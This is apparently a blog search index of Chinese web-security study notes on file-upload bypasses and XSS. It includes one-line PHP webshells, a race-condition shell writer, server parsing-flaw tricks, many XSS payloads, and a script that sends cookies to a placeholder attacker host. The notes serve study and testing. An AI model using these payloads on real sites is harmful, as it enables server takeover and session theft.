<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>文件上传漏洞</title>
      <link href="/p/931c692.html"/>
      <url>/p/931c692.html</url>
      
        <content type="html"><![CDATA[<h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><h2 id="判断流程"><a href="#判断流程" class="headerlink" title="判断流程"></a>判断流程</h2><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20221025120124311.png" alt="image-20221025120124311"></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20221025120059224.png" alt="image-20221025120059224"></p><h1 id="绕过方式："><a href="#绕过方式：" class="headerlink" title="绕过方式："></a>绕过方式：</h1><h2 id="客户端js检测绕过攻击"><a href="#客户端js检测绕过攻击" class="headerlink" title="客户端js检测绕过攻击"></a>客户端js检测绕过攻击</h2><ul><li>抓包修改后缀</li><li>更改客户端js</li></ul><h2 id="文件类型绕过"><a href="#文件类型绕过" class="headerlink" title="文件类型绕过"></a>文件类型绕过</h2><p>Content-Type类型改为：<code>image/jpeg</code></p><h2 id="后缀绕过"><a href="#后缀绕过" class="headerlink" title="后缀绕过"></a>后缀绕过</h2><h3 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h3><p>黑名单无过滤<code>.htaccess</code>上传<code>.htaccess</code>内容为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#能够解析.php .phtml .phps .php5 .pht</span><br><span class="line">AddType application/x-httpd-php .php .phtml .phps .php5 .pht</span><br><span class="line">#就是在upload目录下匹配shell.jpg的文件并以php文件执行</span><br><span class="line">&lt;FilesMatch &quot;shell.jpg&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line">#全部解析</span><br><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure><h3 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h3><p>借助<code>.user.ini</code>轻松让所有php文件都“自动”包含某个文件，而这个文件可以是一个正常php文件，也可以是一个包含一句话的webshell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=1.png</span><br></pre></td></tr></table></figure><blockquote><p><code>user.ini.</code>它比<code>.htaccess</code>用的更广，不管是nginx/apache/IIS，只要是以fastcgi运行的php都可以用这个方法。<br>条件:<br>服务器脚本语言为PHP<br>对应目录下面有可执行的php文件,如index.php<br>服务器使用CGI／FastCGI模式</p></blockquote><p><a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">详情见</a></p><h3 id="常用绕过后缀"><a href="#常用绕过后缀" class="headerlink" title="常用绕过后缀"></a>常用绕过后缀</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PHP:</span><br><span class="line">php2、php3、php5、phtml、pht(是否解析需要根据配置文件中设置类型来决定)</span><br><span class="line">ASP：</span><br><span class="line">asa、cer、cdx</span><br><span class="line">ASPX：</span><br><span class="line">ascx、ashx、asac</span><br><span class="line">JSP：</span><br><span class="line">jsp、jspx、jspf</span><br></pre></td></tr></table></figure><h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><p>0x00是字符串的结束标识符，攻击者可以利用手动添加字符串标识符的方式来将后面的内容进行截断，而后面的内容又可以帮助我们绕过检测</p><h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.php版本&lt;5.3.4(不包括5.3.4)</span><br><span class="line">2.php开启magic_quotes_gpc,即Off,php.ini配置如下：</span><br><span class="line">; Magic quotes for incoming GET/POST/Cookie data.</span><br><span class="line">magic_quotes_gpc =Off</span><br><span class="line">3.数据包中必须含有上传后文件的目录情况才可以使用</span><br></pre></td></tr></table></figure><h4 id="错误使用"><a href="#错误使用" class="headerlink" title="错误使用"></a>错误使用</h4><p>在文件名后直接<code>%00</code>截断，是错误的例如：<code>shell.php%00test.jpg</code>，截断后提取的后缀还是<code>.php</code></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image.png" alt="gaeehsrbg"></p><h4 id="正确路径使用"><a href="#正确路径使用" class="headerlink" title="正确路径使用"></a>正确路径使用</h4><p>为什么修改path才可以，因为程序中检测的是文件的后缀名，如果后缀合法则拼接路径和文件名，那么攻击者修改了path以后的拼接结果为：<code>uploads/shell.php%00/2018051413370000.jpg</code>，移动文件的时候会将文件保存为<code>uploads/shell.php</code></p><h4 id="00和-00-urldecode"><a href="#00和-00-urldecode" class="headerlink" title="%00和%00(urldecode)"></a>%00和%00(urldecode)</h4><p><strong>%00(urldecode)</strong></p><p>需要<code>urldecode</code>操作，原因在于上传的表单中有<code>enctype</code>的属性，并且需要<code>enctype=&quot;multipart/form-data&quot;</code> (不对表单中数据进行编码)，<code>path</code>大多数都是存放在表单中的，因此需要在数据包中进行urldecode操作使<code>%00</code>变成字符串结束符号。</p><p><strong>%00</strong></p><p>因为path也可以存放在URL或者Cookie中，而在提交数据的时候，浏览器会对数据做一次<code>urldecode</code>的操作，而到服务端，会对数据进行一次urldecode的操作，因此如果path在<code>非enctype=multipart/form-data</code>的表单中或URL or Cookie中的时候，就可以直接写<code>%00</code>不需要进行URLdecode操作，让服务端对<code>%00</code>进行URL解码即可。</p><h2 id="内容过滤"><a href="#内容过滤" class="headerlink" title="内容过滤"></a>内容过滤</h2><h3 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h3><p>短标签，绕过<code>php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>])<span class="meta">?&gt;</span></span><br><span class="line">&lt;% <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);%&gt;</span><br></pre></td></tr></table></figure><h1 id="竞争条件"><a href="#竞争条件" class="headerlink" title="竞争条件"></a>竞争条件</h1><p>检查上传的文件是否包含WebShell脚本，如果包含就删除。上传成功和删除文件存在时间差。</p><p>先上传webshell文件10.php 10.php生成新的脚本shell.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    fputs(fopen(<span class="string">&#x27;../shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[a]) ?&gt;&#x27;</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="漏洞在系统中的差异"><a href="#漏洞在系统中的差异" class="headerlink" title="漏洞在系统中的差异"></a>漏洞在系统中的差异</h1><p>常用的web容器有IIS、Tomcat、Nginx、Apache等</p><h2 id="IIS-5-x-6-0解析漏洞"><a href="#IIS-5-x-6-0解析漏洞" class="headerlink" title="IIS 5.x/6.0解析漏洞"></a>IIS 5.x/6.0解析漏洞</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、当创建.asp的文件目录的时候，在此目录下的任意文件，服务器都解析为asp文件。例如如下：</span><br><span class="line">漏洞目录利用形式：www.xxx.com/xx.asp/xx.jpg。</span><br><span class="line">xx.jpg的内容可以为一段合法的asp脚本文件。</span><br><span class="line"><span class="number">2</span>、服务器默认不解析”;“以后的内容，导致xx.asp;.jpg被解析成xx.asp</span><br><span class="line">漏洞文件利用形式：www.xxx.com/xx.asp;.jpg</span><br><span class="line">xx.jpg的内容可以为一段合法的asp脚本文件。</span><br></pre></td></tr></table></figure><p>漏洞产生的原因参考详细文章内容：<a href="https://www.cnblogs.com/l1pe1/p/9210094.html">https://www.cnblogs.com/l1pe1/p/9210094.html</a></p><p>可以理解为的检测流程为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www.xxx.com/xxx.asp;xxx.jpg</span><br><span class="line">N1:从头部查找查找<span class="string">&quot;.&quot;</span>号,获得<span class="string">&quot;.asp;xxxx.jpg&quot;</span></span><br><span class="line">N2:查找<span class="string">&quot;;&quot;</span>号,如果有则内存截断</span><br><span class="line">N3:查找<span class="string">&quot;/&quot;</span>,如果有则内存截断</span><br></pre></td></tr></table></figure><p>因此，.asp将最终被保存下来，IIS6只简单地根据扩展名来识别，所以从脚本映射表中里查找脚本与扩展名对比，并利用asp.dll来解析。导致最终的问题产生。</p><p>对于此问题，微软并不认为这是一个漏洞，同样也没推出IIS6.0解析漏洞的补丁。因此在IIS6.0的网站下，此问题仍然可以尝试是否存在。</p><h2 id="Nginx-解析漏洞"><a href="#Nginx-解析漏洞" class="headerlink" title="Nginx 解析漏洞"></a>Nginx 解析漏洞</h2><p> 在低版本Nginx中存在一个由PHP-CGI导致的文件解析漏洞。为什么是由于PHP-CGI的原因呢，因为在PHP的配置文件中有一个关键的选项<code>cgi.fix_pathinfo</code>在本机中位于<code>php.ini</code>配置文件中，默认是开启的，当URL中有不存在的文件时，PHP就会默认向前解析。</p><p> 普遍的做法是在Nginx配置文件中通过正则匹配设置<code>SCRIPT_FILENAME</code>。访问 <code>www.xx.com/phpinfo.jpg/1.php</code>这个URL时，<code>$fastcgi_script_name</code>会被设置为<code>phpinfo.jpg/1.php</code>，然后构造成<code>SCRIPT_FILENAME</code>传递给PHP-CGI，但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢?这就要说到<code>fix_pathinfo</code>这个选项了。如果开启了这个选项，那么就会触发在PHP中的如下逻辑：PHP会认为<code>SCRIPT_FILENAME</code>是<code>phpinfo.jpg</code>，而<code>1.php</code>是<code>PATH_INFO</code>，所以就会将<code>phpinfo.jpg</code>作为PHP文件来解析了</p><p> 在默认Fast-CGI开启状况下上传名字为xx.jpg,内容为:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?PHP</span> fputs(fopen(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php eval($_POST[cmd])?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后访问<code>xx.jpg/.php</code>,在这个目录下就会生成一句话木马<code>shell.php</code>。</p><h2 id="Apache-解析漏洞"><a href="#Apache-解析漏洞" class="headerlink" title="Apache 解析漏洞"></a>Apache 解析漏洞</h2><p> Apache是世界使用排名第一的Web服务器软件。它可以运行在几乎所有广泛使用的计算机平台上，由于其跨平台和安全性被广泛使用，是最流行的Web服务器端软件之一。它快速、可靠并且可通过简单的API扩充，将Perl/Python等解释器编译到服务器中。</p><p> Apache 在1.x和2.x版本中存在解析漏洞，例如如下地址格式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.xxxx.com/apache.php.bbb.aaa</span><br></pre></td></tr></table></figure><p>Apache从右至左开始判断后缀，若aaa非可识别后缀，再判断bbb，直到找到可识别后缀为止，然后将该可识别后缀进解析，因此如上地址解析为访问apache.php文件。</p><p>那么为什么会产生此问题原因，在Apache的官方网站上，有一句这么关于“extension”的解释：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">地址：http://httpd.apache.org/docs/current/mod/directive-dict.html</span><br><span class="line">extension</span><br><span class="line">In general, this is the part of the filename which follows the last dot. However, Apache recognizes multiple filename extensions, so if a filename contains more than one dot, each dot-separated part of the filename following the first dot is an extension. For example, the filename file.html.en contains two extensions: .html and .en. For Apache directives, you may specify extensions with or without the leading dot. In addition, extensions are not case sensitive.</span><br></pre></td></tr></table></figure><p> 通过这个解释可以看出来，Apache允许文件有多个后缀名，并会按照第一个点来分析文件后缀，例如<code>file.html.en</code>。Apache按照每个点来分割后缀名，因此此文件名为<code>.html.en</code>。由于en后缀不被识别，便继续向前解析。</p><p> 另外对于Apache解析漏洞的正确说法应该是，使用module模式与php结合的所有版本 apache存在未知扩展名解析漏洞，使用fastcgi模式与php结合的所有版本apache不存在此漏洞。而是否解析的后缀名在文件<code>mime.types</code>中查找是否出现。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS</title>
      <link href="/p/68bdea49.html"/>
      <url>/p/68bdea49.html</url>
      
        <content type="html"><![CDATA[<h2 id="XSS危害"><a href="#XSS危害" class="headerlink" title="XSS危害"></a>XSS危害</h2><ul><li>网络钓鱼</li><li>盗取用户cookies信息，劫持会话，用户浏览器</li><li>强制弹出广告页面、刷流量</li><li>网页挂马</li><li>任意篡改页面信息</li><li>获取客户端隐私信息</li><li>控制受害者机器向其他网站发起攻击</li><li>结合其他漏洞，如CSRF漏洞</li><li>提升用户权限，内网扫描</li><li>传播跨站脚本蠕虫等</li></ul><h2 id="常用语句"><a href="#常用语句" class="headerlink" title="常用语句"></a>常用语句</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> //经典语句</span><br><span class="line">&#x27;-prompt(1)-&#x27;</span><br><span class="line"><span class="tag">&lt;<span class="name">BODY</span> <span class="attr">ONLOAD</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span> = <span class="string">javasript:alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="获取cookie"><a href="#获取cookie" class="headerlink" title="获取cookie"></a>获取cookie</h3><p>服务端</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$content</span>))&#123;</span><br><span class="line">        file_put_contents(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="variable">$content</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;no date input&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>注意写权限</p></blockquote><p>链接</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.location.href=<span class="string">&#x27;http://xx.xx.xx.xx:8080/x.php?1=&#x27;</span>+<span class="built_in">document</span>.cookie</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&lt;body/onload=&quot;document.location.href=&#x27;http://xx.xx.xx.xx:8080/x.php?1=&#x27;+document.cookie&quot;&gt;</span><br></pre></td></tr></table></figure><h2 id="XSS插入点"><a href="#XSS插入点" class="headerlink" title="XSS插入点"></a>XSS插入点</h2><ul><li>用户输入作为script标签内容</li><li>用户输入作为HTML注释内容</li><li>用户输入作为HTML标签的属性名</li><li>用户输入作为HTML标签的属性值</li><li>用户输入作为HTML标签的名字</li><li>直接插入到CSS里</li><li>最重要的是，千万不要引入任何不可信的第三方JavaScript到页面里！</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#用户输入作为HTML注释内容，导致攻击者可以进行闭合绕过</span><br><span class="line"><span class="comment">&lt;!-- 用户输入 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- --&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&#x27;hack&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="comment">&lt;!-- --&gt;</span></span><br><span class="line"> </span><br><span class="line">#用户输入作为标签属性名，导致攻击者可以进行闭合绕过</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> 用户输入=<span class="string">&quot;xx&quot;</span>&gt;</span>  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> &gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&#x27;hack&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">a</span>=<span class="string">&quot;xx&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">#用户输入作为标签属性值，导致攻击者可以进行闭合绕过</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;用户输入&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&#x27;hack&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">a</span>=<span class="string">&quot;x&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">#用户输入作为标签名，导致攻击者可以进行闭合绕过</span><br><span class="line">&lt;用户输入  id=&quot;xx&quot; /&gt;</span><br><span class="line"><span class="tag">&lt;&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&#x27;hack&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">b</span> <span class="attr">id</span>=<span class="string">&quot;xx&quot;</span> /&gt;</span></span><br><span class="line"> </span><br><span class="line">#用户输入作为CSS内容，导致攻击者可以进行闭合绕过</span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="xml">用户输入<span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="xml"></span></span></span><br><span class="line"><span class="xml"><span class="xml"><span class="tag">&lt;<span class="name">style</span>&gt;</span> </span></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&#x27;hack&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span> <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="常见标签"><a href="#常见标签" class="headerlink" title="常见标签"></a>常见标签</h2><h3 id="lt-scirpt-gt"><a href="#lt-scirpt-gt" class="headerlink" title="&lt;scirpt&gt;"></a><code>&lt;scirpt&gt;</code></h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">scirpt</span>&gt;</span>alert(&quot;xss&quot;);<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="lt-img-gt"><a href="#lt-img-gt" class="headerlink" title="&lt;img&gt;"></a><code>&lt;img&gt;</code></h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;);&gt;</span></span><br></pre></td></tr></table></figure><h3 id="lt-input-gt"><a href="#lt-input-gt" class="headerlink" title="&lt;input&gt;"></a><code>&lt;input&gt;</code></h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onfocus</span>=<span class="string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">竞争焦点，从而触发onblur事件</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onblur</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;) <span class="attr">autofocus</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">autofocus</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onfocus</span>=<span class="string">&quot;alert(&#x27;xss&#x27;);&quot;</span> <span class="attr">autofocus</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="lt-details-gt"><a href="#lt-details-gt" class="headerlink" title="&lt;details&gt;"></a><code>&lt;details&gt;</code></h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">ontoggle</span>=<span class="string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">使用open属性触发ontoggle事件，无需用户去触发</span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="lt-svg-gt"><a href="#lt-svg-gt" class="headerlink" title="&lt;svg&gt;"></a><code>&lt;svg&gt;</code></h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;);&gt;</span></span><br></pre></td></tr></table></figure><h3 id="lt-select-gt"><a href="#lt-select-gt" class="headerlink" title="&lt;select&gt;"></a><code>&lt;select&gt;</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;select onfocus=alert(1)&gt;&lt;/select&gt;</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发</span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span> <span class="attr">autofocus</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="lt-iframe-gt"><a href="#lt-iframe-gt" class="headerlink" title="&lt;iframe&gt;"></a><code>&lt;iframe&gt;</code></h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;);&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="lt-video-gt"><a href="#lt-video-gt" class="headerlink" title="&lt;video&gt;"></a><code>&lt;video&gt;</code></h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">video</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="lt-audio-gt"><a href="#lt-audio-gt" class="headerlink" title="&lt;audio&gt;"></a><code>&lt;audio&gt;</code></h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">src</span>=<span class="string">x</span>  <span class="attr">onerror</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;);&gt;</span></span><br></pre></td></tr></table></figure><h3 id="lt-body-gt"><a href="#lt-body-gt" class="headerlink" title="&lt;body&gt;"></a><code>&lt;body&gt;</code></h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body/onload=alert(&quot;xss&quot;);&gt;</span><br></pre></td></tr></table></figure><p>利用换行符以及autofocus，自动去触发onscroll事件，无需用户去触发</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span></span></span><br><span class="line"><span class="tag"><span class="attr">onscroll</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;);&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span 